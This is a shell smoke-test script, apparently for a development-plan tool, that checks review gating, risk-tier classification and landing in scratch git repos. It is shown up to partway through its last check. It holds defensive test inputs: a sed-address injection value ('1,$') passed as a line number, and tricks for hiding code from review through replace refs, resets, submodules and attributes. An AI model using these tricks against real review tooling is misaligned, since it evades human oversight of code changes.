mkdir -p "$SMOKE_TMP/fd33/scripts"; printf '#!/bin/sh\n(sleep 6 >/dev/null 2>&1 </dev/null &)\necho "rung: effort+1"\n' >"$SMOKE_TMP/fd33/scripts/route.sh"; chmod +x "$SMOKE_TMP/fd33/scripts/route.sh"
printf '{"route_id": "r1"}' >"$CKS/dispatch/active-route.json"
has "ESCALATE_ROUTE: rung: effort+1" "$(cd "$CK" && APEX_DISPATCH_ROOT="$SMOKE_TMP/fd33" "$CP" plans/c-plan.md fail 1 "esc" 2>&1)" || fail "fail did not relay route.sh escalate"
t0=$SECONDS; (cd "$CK" && "$CP" plans/c-plan.md halt "lock probe" >/dev/null && "$CP" plans/c-plan.md resume "lock probe" >/dev/null)
[ $((SECONDS - t0)) -lt 4 ] || fail "a background child of route.sh held the checkpoint lock"
rm -f "$CKS/dispatch/active-route.json"
rm -f "$CKS/dispatch/reviews-raw/ag1.json" "$CKS/dispatch/reviews-raw/ag1b.json"
printf '{"head_sha": "%s", "verdict": "REQUEST_CHANGES", "role": "reviewer", "line": 1, "record_id": "run-0002"}' "$(sha)" >"$CKS/dispatch/reviews-raw/ag2.json"
(cd "$CK" && "$CP" plans/c-plan.md review 1 "$(sha)" REQUEST_CHANGES rv2 --agent-id ag2 >/dev/null) || fail "a new record (possibly on a reused inode) was refused as already recorded"
ok "checkpoint: provenance required with dispatch state; role and line from the record; one use per record"

# 34. risk-tier: path classification fails closed (sso/acl inside words only
#     when the whole word is an allowlisted ordinary word; renames keep the
#     old path; unquoted UTF-8 paths); the diff base is the chain floor, never
#     later; the decision layer can raise a tier, never lower it.
rt_tier() { # rt_tier PATH... — the tier of a task diff that adds PATH(s), in a fresh run
  local d wt f; d="$(mktemp -d "$SMOKE_TMP/rt.XXXXXX")"; mkdir -p "$d/plans"; git init -q -b main "$d"
  git -C "$d" config core.quotepath false
  printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n' >"$d/plans/r-plan.md"; git -C "$d" add -A; git -C "$d" commit -qm r
  ( cd "$d" && APEX_GIBSON=0 "$EX/init.sh" plans/r-plan.md >/dev/null 2>&1 ) || { echo "init-failed"; return 0; }
  wt="$(st "$d" plans/r-plan.md)/worktree"
  for f in "$@"; do mkdir -p "$wt/$(dirname "$f")"; echo x >"$wt/$f"; done
  git -C "$wt" add -A; git -C "$wt" commit -qm t
  (cd "$d" && "$EX/risk-tier.sh" plans/r-plan.md 1 --no-record 2>&1) | sed -n 's/^TIER: //p'
}
for f in src/jwtVerify.ts lib/userRoles.ts src/userACLs.ts src/AzureADSSO.ts src/sso2/index.ts src/associateSSOIdentity.ts \
         src/ProcessorSSO.ts src/lessonsso.ts k8s/clusterrolebinding.yaml "İİİİ/sso/associated.ts" "db/données.sql"; do
  [ "$(rt_tier "$f")" = C ] || fail "$f was not Tier C"
done
# A submodule bump is code even when .gitmodules says ignore = all; a
# "-diff" attribute does not hide added lines.
SM="$(mktemp -d "$SMOKE_TMP/sm.XXXXXX")"; mkdir -p "$SM/plans"; git init -q -b main "$SM"
printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n' >"$SM/plans/s-plan.md"; git -C "$SM" add -A; git -C "$SM" commit -qm s
( cd "$SM" && APEX_GIBSON=0 "$EX/init.sh" plans/s-plan.md >/dev/null 2>&1 ) || fail "init for the submodule test failed"
SWT="$(st "$SM" plans/s-plan.md)/worktree"
printf '[submodule "x"]\n\tpath = vendor/auth\n\turl = ./x\n\tignore = all\n' >"$SWT/.gitmodules"
git -C "$SWT" update-index --add --cacheinfo "160000,$(git -C "$SWT" rev-parse HEAD),vendor/auth"; git -C "$SWT" add .gitmodules; git -C "$SWT" commit -qm sub
has "^TIER: C" "$(cd "$SM" && "$EX/risk-tier.sh" plans/s-plan.md 1 --no-record)" || fail "a submodule under an auth path (ignore = all) was not Tier C"
printf '*.py -diff\n' >"$SWT/.gitattributes"; echo 'stripe.Charge.create(amount_cents=1)' >"$SWT/pay_util.py"; git -C "$SWT" add -A; git -C "$SWT" commit -qm attr
has "content signal" "$(cd "$SM" && "$EX/risk-tier.sh" plans/s-plan.md 1 --no-record)" || fail "a -diff attribute hid a content signal"
for f in scripts/lessons.sh src/oracle.ts "lessons/İ.py"; do
  [ "$(rt_tier "$f")" = A ] || fail "$f was classified above Tier A"
done
RT="$SMOKE_TMP/rt34"; mkdir -p "$RT/plans" "$RT/src/auth"; git init -q -b main "$RT"
for i in 1 2; do printf -- '- [ ] **Phase 1.%s** a\n  - Acceptance: true\n' "$i"; done >"$RT/plans/r-plan.md"
echo x >"$RT/src/auth/session.py"; git -C "$RT" add -A; git -C "$RT" commit -qm r
( cd "$RT" && APEX_GIBSON=0 "$EX/init.sh" plans/r-plan.md >/dev/null 2>&1 ) || fail "init for the risk-tier test failed"
RWT="$(st "$RT" plans/r-plan.md)/worktree"
printf '#!/bin/sh\necho "{\\"verdict\\": \\"$FAKE_TIER\\", \\"uncertain\\": false}"\n' >"$SMOKE_TMP/decide.sh"; chmod +x "$SMOKE_TMP/decide.sh"
has "^TIER: B" "$(cd "$RT" && FAKE_TIER=B APEX_DECIDE_CMD="$SMOKE_TMP/decide.sh" "$EX/risk-tier.sh" plans/r-plan.md 3 --classify)" || fail "the decision layer could not raise the tier"
has "^TIER: B" "$(cd "$RT" && FAKE_TIER=A APEX_DECIDE_CMD="$SMOKE_TMP/decide.sh" "$EX/risk-tier.sh" plans/r-plan.md 3 --classify)" || fail "the decision layer lowered a recorded tier"
git -C "$RWT" mv src/auth/session.py src/x.py; git -C "$RWT" commit -qm mv
has "^TIER: C" "$(cd "$RT" && "$EX/risk-tier.sh" plans/r-plan.md 1)" || fail "an auth file renamed to a bland name was not Tier C"
expect_refusal "an unknown --since" "not a commit" indir "$RT" "$EX/risk-tier.sh" plans/r-plan.md 1 --since deadbeefdeadbeef
expect_refusal "a --since later than the task's base" "later than this task's base" indir "$RT" "$EX/risk-tier.sh" plans/r-plan.md 1 --since "$(git -C "$RWT" rev-parse HEAD)"
expect_refusal "a non-numeric risk-tier line" "plan line number" indir "$RT" "$EX/risk-tier.sh" plans/r-plan.md '1,$'
expect_refusal "a risk-tier line that is not a task" "not a task" indir "$RT" "$EX/risk-tier.sh" plans/r-plan.md 2
ok "risk-tier: fail-closed path classes, renames, UTF-8 paths, chain floor; decision layer raises only"

# 35. green-gate re-baselines a step the baseline never ran, at the fork SHA,
#     only when the fork resolves the same command (a plan-added step stays strict).
RB="$SMOKE_TMP/rb35"; mkdir -p "$RB/plans"; git init -q -b main "$RB"
printf 'test:\n\t@false\n' >"$RB/Makefile"; printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n' >"$RB/plans/b-plan.md"; git -C "$RB" add -A; git -C "$RB" commit -qm b
( cd "$RB" && "$EX/init.sh" plans/b-plan.md >/dev/null 2>&1 ) || fail "init for the re-baseline test failed"
BL="$(st "$RB" plans/b-plan.md)/gate/baseline.json"
python3 - "$BL" <<'PY'
import json, sys
p = sys.argv[1]; b = json.load(open(p)); b["steps"]["test"] = {"cmd": "", "exit": None}; json.dump(b, open(p, "w"))
PY
has "GATE_STEP: test PREEXISTING" "$( (cd "$RB" && "$EX/green-gate.sh" plans/b-plan.md check) 2>&1 || true)" || fail "a pre-existing red step missing from an old baseline was blamed on the plan"
NB="$SMOKE_TMP/nb35"; mkdir -p "$NB/plans"; git init -q -b main "$NB"
printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n' >"$NB/plans/n-plan.md"; git -C "$NB" add -A; git -C "$NB" commit -qm n
( cd "$NB" && "$EX/init.sh" plans/n-plan.md >/dev/null 2>&1 ) || fail "init for the strict re-baseline test failed"
NWT="$(st "$NB" plans/n-plan.md)/worktree"; printf 'test:\n\t@false\n' >"$NWT/Makefile"; git -C "$NWT" add -A; git -C "$NWT" commit -qm m
has "GATE_STEP: test NEW_FAILURE" "$( (cd "$NB" && "$EX/green-gate.sh" plans/n-plan.md check) 2>&1 || true)" || fail "a failing step the plan itself added was excused as pre-existing"
ok "green-gate: re-baseline at the fork only for steps the fork resolves"

# 36. checkpoint hardening: LINE_NO is a task line number (no sed address
#     injection, no "01" key); a REQUEST_CHANGES at a head survives `fail`;
#     Tier C never takes --skip-review; a missing tier is never waived; parallel
#     reviews keep every record; a halt clears with `resume`, not `rewind`.
CH="$SMOKE_TMP/ch36"; mkdir -p "$CH/plans"; git init -q -b main "$CH"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n- [ ] **Phase 1.2** [docs] b\n  - Acceptance: true\n' >"$CH/plans/h-plan.md"; git -C "$CH" add -A; git -C "$CH" commit -qm h
( cd "$CH" && APEX_GIBSON=0 "$EX/init.sh" plans/h-plan.md >/dev/null 2>&1 ) || fail "init for the hardening test failed"
CHS="$(st "$CH" plans/h-plan.md)"; HWT="$CHS/worktree"; hsha() { git -C "$HWT" rev-parse HEAD; }
P0="$(cat "$CH/plans/h-plan.md")"
for bad in '1,$' 01 0 2; do
  expect_refusal "complete with LINE_NO '$bad'" "LINE_NO\|not a task" indir "$CH" "$CP" plans/h-plan.md complete "$bad" ok --skip-review n/a
  expect_refusal "rewind with LINE_NO '$bad'" "LINE_NO\|not a task" indir "$CH" "$CP" plans/h-plan.md rewind "$bad"
done
[ "$P0" = "$(cat "$CH/plans/h-plan.md")" ] || fail "a refused LINE_NO still edited the plan"
expect_refusal "no tier recorded, --skip-review" "no risk tier recorded" indir "$CH" "$CP" plans/h-plan.md complete 1 ok --skip-review n/a
git -C "$HWT" commit -q --allow-empty -m h1
(cd "$CH" && "$EX/green-gate.sh" plans/h-plan.md check >/dev/null 2>&1) || true
python3 - "$CHS/checkpoint.json" "$(hsha)" <<'PY'
import json, sys
p, h = sys.argv[1:]; s = json.load(open(p)); s.setdefault("tiers", {}).update({"1": {"tier": "C", "head": h}, "3": {"tier": "A", "head": h}}); json.dump(s, open(p, "w"))
PY
(cd "$CH" && "$CP" plans/h-plan.md approve 1 "$(hsha)" "approve G12 1" >/dev/null)
expect_refusal "Tier C with --skip-review" "cannot waive" indir "$CH" "$CP" plans/h-plan.md complete 1 ok --skip-review n/a
(cd "$CH" && "$CP" plans/h-plan.md review 3 "$(hsha)" REQUEST_CHANGES >/dev/null && "$CP" plans/h-plan.md fail 3 retry >/dev/null \
  && "$CP" plans/h-plan.md review 3 "$(hsha)" APPROVE >/dev/null) || fail "the laundering setup failed"
expect_refusal "a REQUEST_CHANGES laundered through fail" "requested changes" indir "$CH" "$CP" plans/h-plan.md complete 3 ok
pids=(); for l in correctness security consent money performance maintainability; do v=APPROVE; [ "$l" = money ] && v=REQUEST_CHANGES
  (cd "$CH" && "$CP" plans/h-plan.md review 1 "$(hsha)" "$v" "r-$l" --role "lens:$l" >/dev/null 2>&1) & pids+=($!); done
for p in "${pids[@]}"; do wait "$p" || fail "a parallel review was refused"; done
python3 -c 'import json,sys; r=[x for x in json.load(open(sys.argv[1]))["reviews"]["1"]["records"]]; assert len(r)==6 and sum(x["verdict"]=="REQUEST_CHANGES" for x in r)==1, len(r)' "$CHS/checkpoint.json" \
  || fail "parallel reviews lost a record"
for i in 1 2 3; do (cd "$CH" && "$CP" plans/h-plan.md fail 1 "f$i" >/dev/null); done
(cd "$CH" && "$CP" plans/h-plan.md rewind 1 >/dev/null)
python3 -c 'import json,sys; assert json.load(open(sys.argv[1]))["halted"]' "$CHS/checkpoint.json" || fail "rewind of an unchecked task cleared a halt"
(cd "$CH" && "$CP" plans/h-plan.md resume "human looked" >/dev/null)
python3 -c 'import json,sys; s=json.load(open(sys.argv[1])); assert not s["halted"] and s["consecutive_failures"]==0' "$CHS/checkpoint.json" || fail "resume did not clear the halt"
# A 0.2.0 REQUEST_CHANGES at the head blocks --skip-review too.
python3 - "$CHS/checkpoint.json" "$(hsha)" <<'PY'
import json, sys
p, h = sys.argv[1:]; s = json.load(open(p)); s["halted"] = False; s["consecutive_failures"] = 0
s["tiers"]["3"] = {"tier": "A", "head": h}; s["reviews"]["3"] = {"sha": h, "verdict": "REQUEST_CHANGES", "round": 1}; json.dump(s, open(p, "w"))
PY
expect_refusal "a 0.2.0 REQUEST_CHANGES with --skip-review" "requested changes" indir "$CH" "$CP" plans/h-plan.md complete 3 ok --skip-review n/a
(cd "$CH" && "$CP" plans/h-plan.md halt "probe" >/dev/null)
expect_refusal "a review while halted" "halted" indir "$CH" "$CP" plans/h-plan.md review 3 "$(hsha)" APPROVE
(cd "$CH" && "$CP" plans/h-plan.md resume "probe" >/dev/null)
# A [gate:*] tag quoted in a code task does not exempt it.
GX="$SMOKE_TMP/gx36"; mkdir -p "$GX/plans"; git init -q -b main "$GX"
printf -- '- [ ] **Phase 1.1** [security] harden auth; docs mention `[gate:auto]` syntax\n  - Acceptance: true\n' >"$GX/plans/x-plan.md"; git -C "$GX" add -A; git -C "$GX" commit -qm x
( cd "$GX" && APEX_GIBSON=0 "$EX/init.sh" plans/x-plan.md >/dev/null 2>&1 ) || fail "init for the gate-tag test failed"
expect_refusal "a code task quoting a gate tag" "no independent review\|no risk tier\|green" indir "$GX" "$CP" plans/x-plan.md complete 1 ok
# A tier classifies one head: new code needs a new classification.
git -C "$HWT" commit -q --allow-empty -m h2; (cd "$CH" && "$EX/green-gate.sh" plans/h-plan.md check >/dev/null 2>&1) || true
expect_refusal "a tier recorded for an older head" "risk tier was recorded for" indir "$CH" "$CP" plans/h-plan.md complete 3 ok --skip-review n/a
# Tasks without a **Phase**/**Gate** id are ordinary tasks.
IX="$SMOKE_TMP/ix36"; mkdir -p "$IX/plans"; git init -q -b main "$IX"
printf -- '- [ ] tidy something without an id\n  - Acceptance: true\n- [ ] rewrite the login handler; unblocks **Gate 2** [gate:human]\n  - Acceptance: true\n' >"$IX/plans/i-plan.md"; git -C "$IX" add -A; git -C "$IX" commit -qm i
( cd "$IX" && APEX_GIBSON=0 "$EX/init.sh" plans/i-plan.md >/dev/null 2>&1 ) || fail "init for the id-less test failed"
(cd "$IX" && APEX_GIBSON=0 "$CP" plans/i-plan.md complete 1 ok >/dev/null 2>&1) && grep -q '^- \[x\] tidy' "$IX/plans/i-plan.md" || fail "an id-less task could not be completed"
(cd "$IX" && "$CP" plans/i-plan.md rewind 1 >/dev/null 2>&1) && grep -q '^- \[ \] tidy' "$IX/plans/i-plan.md" || fail "an id-less task could not be rewound"
expect_refusal "a code task naming a **Gate** in prose" "no green-gate\|no risk tier\|no independent review" indir "$IX" "$CP" plans/i-plan.md complete 3 ok
ok "checkpoint: line validation, no verdict laundering, no Tier C skip, parallel-safe, resume, halt, gate ids"

# 37. The chain (ADR-0003): a task's code is everything since the head the last
#     reviewed complete verified; complete re-classifies it; a gate line is
#     exempt only when it adds no code; land refuses unreviewed commits.
CN="$SMOKE_TMP/cn37"; mkdir -p "$CN/plans"; git init -q -b main "$CN"
printf -- '- [ ] **Phase 1.1** [docs] first\n  - Acceptance: true\n- [ ] **Gate 1→2** [gate:human] sign-off\n  - Acceptance: true\n- [ ] **Phase 2.1** [docs] second\n  - Acceptance: true\n- [ ] **Gate 2→3** [gate:human] [tier:c] security sign-off\n  - Acceptance: true\n' >"$CN/plans/n-plan.md"
git -C "$CN" add -A; git -C "$CN" commit -qm n
( cd "$CN" && APEX_GIBSON=0 "$EX/init.sh" plans/n-plan.md >/dev/null 2>&1 ) || fail "init for the chain test failed"
CNS="$(st "$CN" plans/n-plan.md)"; NWT="$CNS/worktree"; nsha() { git -C "$NWT" rev-parse HEAD; }
cn() { (cd "$CN" && "$@"); }
FORK="$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["fork_sha"])' "$CNS/checkpoint.json")"
[ "$FORK" = "$(nsha)" ] || fail "init did not record the fork point"
echo doc >"$NWT/notes.md"; git -C "$NWT" add -A; git -C "$NWT" commit -qm doc; H1="$(nsha)"
cn "$EX/green-gate.sh" plans/n-plan.md check >/dev/null 2>&1 || true
cn "$EX/risk-tier.sh" plans/n-plan.md 1 >/dev/null; cn "$CP" plans/n-plan.md review 1 "$H1" APPROVE >/dev/null
cn "$CP" plans/n-plan.md complete 1 ok >/dev/null 2>&1 || fail "a reviewed docs task could not complete"
has "^TASK_BASE: $H1" "$(cn "$EX/iterate.sh" plans/n-plan.md 2>&1)" || fail "TASK_BASE is not the head the last complete verified"
cn "$EX/risk-tier.sh" plans/n-plan.md 3 >/dev/null                      # gate tiered A on an empty diff
mkdir -p "$NWT/src/auth"; echo x >"$NWT/src/auth/login.py"; git -C "$NWT" add -A; git -C "$NWT" commit -qm auth
cn "$EX/green-gate.sh" plans/n-plan.md check >/dev/null 2>&1 || true
expect_refusal "a gate line carrying code (tiered before the code)" "recorded for\|classifies as Tier C\|no independent review" cn "$CP" plans/n-plan.md complete 3 ok
expect_refusal "a --since after the last complete" "later than this task's base" cn "$EX/risk-tier.sh" plans/n-plan.md 3 --since "$(nsha)"
python3 - "$CNS/checkpoint.json" "$(nsha)" <<'PY'
import json, sys
p, h = sys.argv[1:]; s = json.load(open(p)); s["tiers"]["3"] = {"tier": "A", "head": h}; json.dump(s, open(p, "w"))
PY
expect_refusal "a recorded tier below the task diff" "classifies as Tier C" cn "$CP" plans/n-plan.md complete 3 ok
cn "$CP" plans/n-plan.md fail 3 retry >/dev/null
has "^TASK_BASE: $H1" "$(cn "$EX/iterate.sh" plans/n-plan.md 2>&1)" || fail "fail moved the chain floor"
git -C "$NWT" reset -q --hard "$H1"
cn "$CP" plans/n-plan.md complete 3 ok >/dev/null 2>&1 || fail "a gate line with no code could not complete"
expect_refusal "a [tier:c] gate line" "no risk tier\|adversarial\|G12\|no independent review" cn "$CP" plans/n-plan.md complete 7 ok
echo y >"$NWT/src.py"; mkdir -p "$NWT/src/auth"; echo x >"$NWT/src/auth/token.py"; git -C "$NWT" add -A; git -C "$NWT" commit -qm unreviewed
(cd "$CN" && APEX_GIBSON=0 "$CP" plans/n-plan.md complete 5 ok >/dev/null 2>&1) || fail "APEX_GIBSON=0 complete failed"
has "^TASK_BASE: $H1" "$(cn "$EX/iterate.sh" plans/n-plan.md 2>&1)" || fail "an APEX_GIBSON=0 completion advanced the chain"
(cd "$CN" && APEX_GIBSON=0 "$CP" plans/n-plan.md complete 7 ok >/dev/null 2>&1) || fail "APEX_GIBSON=0 complete of the last task failed"
expect_refusal "landing commits no reviewed complete covered" "after the last reviewed completion" cn "$EX/land.sh" plans/n-plan.md
cn "$CP" plans/n-plan.md rewind 1 >/dev/null
python3 -c 'import json,sys; s=json.load(open(sys.argv[1])); assert not s["completes"], s["completes"]' "$CNS/checkpoint.json" || fail "rewind did not move the chain back"
# A run that predates the chain gets its fork point from the base branch on
# re-init, never from the worktree head (unreviewed commits stay in the diff).
python3 - "$CNS/checkpoint.json" <<'PY'
import json, sys
p = sys.argv[1]; s = json.load(open(p)); s.pop("fork_sha", None); s.pop("completes", None); json.dump(s, open(p, "w"))
PY
(cd "$CN" && APEX_GIBSON=0 "$EX/init.sh" plans/n-plan.md >/dev/null 2>&1) || fail "re-init of a pre-chain run failed"
python3 -c 'import json,sys; s=json.load(open(sys.argv[1])); assert s["fork_sha"]==sys.argv[2], s["fork_sha"]' "$CNS/checkpoint.json" "$FORK" \
  || fail "re-init took the fork point from the worktree head"
# Land: a worktree that cannot be removed leaves the run unlanded.
LD="$SMOKE_TMP/ld37"; mkdir -p "$LD/plans"; git init -q -b main "$LD"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n' >"$LD/plans/l-plan.md"; git -C "$LD" add -A; git -C "$LD" commit -qm l
( cd "$LD" && APEX_GIBSON=0 "$EX/init.sh" plans/l-plan.md >/dev/null 2>&1 ) || fail "init for the land test failed"
LWT="$(st "$LD" plans/l-plan.md)/worktree"; echo doc >"$LWT/notes.md"; git -C "$LWT" add -A; git -C "$LWT" commit -qm d
(cd "$LD" && "$EX/green-gate.sh" plans/l-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/l-plan.md 1 >/dev/null \
  && "$CP" plans/l-plan.md review 1 "$(git -C "$LWT" rev-parse HEAD)" APPROVE >/dev/null && "$CP" plans/l-plan.md complete 1 ok >/dev/null 2>&1) \
  || fail "the land fixture task could not complete"
git -C "$LD" add plans/l-plan.md; git -C "$LD" commit -qm tick
git -C "$LD" worktree lock "$LWT"
expect_refusal "landing with a worktree that cannot be removed" "could not remove the worktree" indir "$LD" "$EX/land.sh" plans/l-plan.md
python3 -c 'import json,sys; assert not json.load(open(sys.argv[1]))["landed"]' "$(dirname "$LWT")/checkpoint.json" || fail "a run whose worktree survived was marked landed"
ok "chain: fork point, TASK_BASE, re-classified complete, code-free gates, fail/rewind/APEX_GIBSON=0, land boundary, re-init, surviving worktree"

# 38. Chain hardening: no tier escapes through an environment-chosen
#     exclusion, a binary file in the same diff, a reset onto an older
#     commit, a replace ref, or a fork point that is no longer on the base.
mkrun() { # mkrun DIR — a one-task docs run, initialised; prints its worktree
  mkdir -p "$1/plans"; git init -q -b main "$1"
  printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n- [ ] **Phase 1.2** [docs] b\n  - Acceptance: true\n' >"$1/plans/k-plan.md"
  git -C "$1" add -A; git -C "$1" commit -qm k
  ( cd "$1" && APEX_GIBSON=0 "$EX/init.sh" plans/k-plan.md >/dev/null 2>&1 ) || return 1
  printf '%s\n' "$(st "$1" plans/k-plan.md)/worktree"
}
PAY='import stripe  # amount_cents'
K1="$SMOKE_TMP/k1"; KW="$(mkrun "$K1")" || fail "init for check 38 failed"
mkdir -p "$KW/src/billing"; echo "$PAY" >"$KW/src/billing/payment.py"; git -C "$KW" add -A; git -C "$KW" commit -qm pay
has "^TIER: C" "$(cd "$K1" && APEX_LESSONS_FILE="$KW/src" "$EX/risk-tier.sh" plans/k-plan.md 1 --no-record)" || fail "APEX_LESSONS_FILE hid code from the task diff"
K2="$SMOKE_TMP/k2"; KW="$(mkrun "$K2")" || fail "init for check 38 failed"
echo "$PAY" >"$KW/pay_util.py"; printf 'PNG\000\001\002' >"$KW/icon.png"; git -C "$KW" add -A; git -C "$KW" commit -qm bin
has "^TIER: C" "$(cd "$K2" && "$EX/risk-tier.sh" plans/k-plan.md 1 --no-record)" || fail "a binary file in the diff hid a content signal"
K3="$SMOKE_TMP/k3"; KW="$(mkrun "$K3")" || fail "init for check 38 failed"; K3F="$(git -C "$KW" rev-parse HEAD)"
echo "$PAY" >"$KW/pay_util.py"; git -C "$KW" add -A; git -C "$KW" commit -qm x; KX="$(git -C "$KW" rev-parse HEAD)"
git -C "$KW" rm -q pay_util.py; echo doc >"$KW/notes.md"; git -C "$KW" add -A; git -C "$KW" commit -qm y
(cd "$K3" && "$EX/green-gate.sh" plans/k-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/k-plan.md 1 >/dev/null \
  && "$CP" plans/k-plan.md review 1 "$(git -C "$KW" rev-parse HEAD)" APPROVE >/dev/null && "$CP" plans/k-plan.md complete 1 ok >/dev/null 2>&1) \
  || fail "the reset fixture task could not complete"
git -C "$KW" reset -q --hard "$KX"
has "^TASK_BASE: $K3F" "$(cd "$K3" && "$EX/iterate.sh" plans/k-plan.md 2>&1)" || fail "a reset onto an older commit moved the floor onto that commit"
has "^TIER: C" "$(cd "$K3" && "$EX/risk-tier.sh" plans/k-plan.md 3 --no-record)" || fail "code under a reset escaped the task diff"
K4="$SMOKE_TMP/k4"; KW="$(mkrun "$K4")" || fail "init for check 38 failed"; K4F="$(git -C "$KW" rev-parse HEAD)"
echo "$PAY" >"$KW/pay_util.py"; git -C "$KW" add -A; git -C "$KW" commit -qm p
git -C "$KW" replace "$K4F" "$(git -C "$KW" commit-tree "HEAD^{tree}" -m fake)"
has "^TIER: C" "$(cd "$K4" && "$EX/risk-tier.sh" plans/k-plan.md 1 --no-record)" || fail "a replace ref changed what the task diff shows"
K5="$SMOKE_TMP/k5"; KW="$(mkrun "$K5")" || fail "init for check 38 failed"
python3 - "$(dirname "$KW")/checkpoint.json" <<'PY'
import json, sys
p = sys.argv[1]; s = json.load(open(p)); s.pop("fork_sha", None); s.pop("completes", None); json.dump(s, open(p, "w"))
PY
echo "$PAY" >"$KW/pay_util.py"; git -C "$KW" add -A; git -C "$KW" commit -qm p
git -C "$K5" merge -q --no-ff -m hand "$(git -C "$KW" symbolic-ref --short HEAD)"
(cd "$K5" && "$EX/iterate.sh" plans/k-plan.md >/dev/null 2>&1) || true
git -C "$K5" reset -q --hard HEAD~1
expect_refusal "a fork point no longer on the base branch" "not on main\|no diff base" indir "$K5" "$EX/risk-tier.sh" plans/k-plan.md 1 --no-record
ok "chain hardening: env exclusions, binary diffs, resets, replace refs, fork point on the base"

# 39. Classifier inputs do not depend on user git config or pipe sizes; runs
#     without a worktree, on a feature branch or with a remote base work; a run
#     without a worktree cannot restart below unreviewed commits; the user's
#     gate commands keep their git environment.
PRICE='def total(x): return x.price * 2  # charge(currency)'
L1="$SMOKE_TMP/l1"; LW="$(mkrun "$L1")" || fail "init for check 39 failed"
echo "$PRICE" >"$LW/util.py"; git -C "$LW" add -A; git -C "$LW" commit -qm u; git -C "$LW" config color.diff always; git -C "$LW" config color.ui always
has "^TIER: C" "$(cd "$L1" && "$EX/risk-tier.sh" plans/k-plan.md 1 --no-record)" || fail "color.diff=always hid a content signal"
L2="$SMOKE_TMP/l2"; LW="$(mkrun "$L2")" || fail "init for check 39 failed"
{ echo "$PRICE"; seq 1 20000 | sed 's/^/# /'; } >"$LW/aaa_util.py"; git -C "$LW" add -A; git -C "$LW" commit -qm big
has "^TIER: C" "$(cd "$L2" && "$EX/risk-tier.sh" plans/k-plan.md 1 --no-record)" || fail "a large diff with an early signal was not Tier C"
L3="$SMOKE_TMP/l3"; mkdir -p "$L3/plans"; git init -q -b main "$L3"; printf '.dev-plan-state/\n' >"$L3/.gitignore"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n' >"$L3/plans/k-plan.md"; git -C "$L3" add -A; git -C "$L3" commit -qm k
( cd "$L3" && APEX_NO_WORKTREE=1 "$EX/init.sh" plans/k-plan.md >/dev/null 2>&1 ) || fail "no-worktree init failed"
echo "$PRICE" >"$L3/util.py"; git -C "$L3" add -A; git -C "$L3" commit -qm x
expect_refusal "a no-worktree restart (APEX_INIT_FORCE) over unreviewed commits" "below the new run's fork point" \
  indir "$L3" APEX_NO_WORKTREE=1 APEX_INIT_FORCE=1 "$EX/init.sh" plans/k-plan.md
git -C "$L3" mv plans/k-plan.md plans/k2-plan.md; git -C "$L3" commit -qm mv
expect_refusal "a no-worktree run started under a moved plan" "below the new run's fork point" \
  indir "$L3" APEX_NO_WORKTREE=1 "$EX/init.sh" plans/k2-plan.md
L4="$SMOKE_TMP/l4"; mkdir -p "$L4/plans"; git init -q -b main "$L4"; printf '.dev-plan-state/\n' >"$L4/.gitignore"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n' >"$L4/plans/k-plan.md"; git -C "$L4" add -A; git -C "$L4" commit -qm k
git -C "$L4" checkout -qb feature; echo "$PRICE" >"$L4/util.py"; git -C "$L4" add -A; git -C "$L4" commit -qm f
( cd "$L4" && APEX_NO_WORKTREE=1 "$EX/init.sh" plans/k-plan.md >/dev/null 2>&1 ) || fail "no-worktree init on a feature branch failed"
has "^TIER: C" "$(cd "$L4" && "$EX/risk-tier.sh" plans/k-plan.md 1 --no-record 2>&1)" || fail "a no-worktree run on a feature branch did not classify its branch's commits"
L5="$SMOKE_TMP/l5"; mkdir -p "$L5/plans"; git init -q -b main "$L5"; printf '.dev-plan-state/\n' >"$L5/.gitignore"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n' >"$L5/plans/k-plan.md"; git -C "$L5" add -A; git -C "$L5" commit -qm k
git -C "$L5" checkout -qb side; mkdir -p "$L5/src/auth"; echo 'import stripe' >"$L5/src/auth/token.py"; git -C "$L5" add src; git -C "$L5" commit -qm e; LE="$(git -C "$L5" rev-parse HEAD)"
git -C "$L5" checkout -q main; git -C "$L5" merge -q -s ours -m ours side
( cd "$L5" && APEX_GIBSON=0 "$EX/init.sh" plans/k-plan.md >/dev/null 2>&1 ) || fail "init for the -s ours test failed"
LW="$(st "$L5" plans/k-plan.md)/worktree"
git -C "$LW" reset -q --hard "$LE"; echo doc >"$LW/notes.md"; git -C "$LW" add notes.md; git -C "$LW" commit -qm n
expect_refusal "a head that does not descend from the fork point" "no diff base" indir "$L5" "$EX/risk-tier.sh" plans/k-plan.md 1 --no-record
L6="$SMOKE_TMP/l6"; mkdir -p "$L6/plans"; git init -q -b main "$L6.origin"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n' >"$L6.origin/plans/k-plan.md" 2>/dev/null || { mkdir -p "$L6.origin/plans"; printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n' >"$L6.origin/plans/k-plan.md"; }
git -C "$L6.origin" add -A; git -C "$L6.origin" commit -qm o; rm -rf "$L6"; git clone -q "$L6.origin" "$L6"
( cd "$L6" && APEX_BASE_BRANCH=origin/main APEX_GIBSON=0 "$EX/init.sh" plans/k-plan.md >/dev/null 2>&1 ) || fail "init with a remote-only base failed"
has "^TASK_BASE: [0-9a-f]\{40\}" "$(cd "$L6" && "$EX/iterate.sh" plans/k-plan.md 2>&1)" || fail "a run with a remote-only base has no diff base"
L7="$SMOKE_TMP/l7"; mkdir -p "$L7/plans"; git init -q -b main "$L7"
printf 'test:\n\t@test "$$GIT_CONFIG_COUNT" = 1\n' >"$L7/Makefile"; printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n' >"$L7/plans/k-plan.md"; git -C "$L7" add -A; git -C "$L7" commit -qm g
